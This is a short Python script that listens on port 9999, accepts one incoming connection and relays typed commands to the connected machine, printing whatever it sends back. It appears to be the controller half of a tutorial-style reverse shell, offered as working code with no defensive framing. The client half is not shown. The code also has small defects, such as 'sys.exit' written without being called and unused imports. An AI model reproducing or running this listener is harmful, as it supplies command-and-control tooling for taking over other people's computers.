import socket
import sys
import threading
import time
from queue import Queue


# Create socket allows two computers to connect
def socket_create():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error: " + str(msg))


# bind sockect and wait for connection to the client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port " + str(port))
        s.bind((host, port))
        s.listen(10)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind()

# accept connections/ estblish connections(socket must be listining)
def socket_accept():
    conn, address = s.accept()
    print("Conecection has been made with | " + "IP " + address[0] + "| Port " + str(address[1]))
    send_commands(conn)
    conn.close()

#send commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(100204), "utf-8")
            print(client_response, end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()
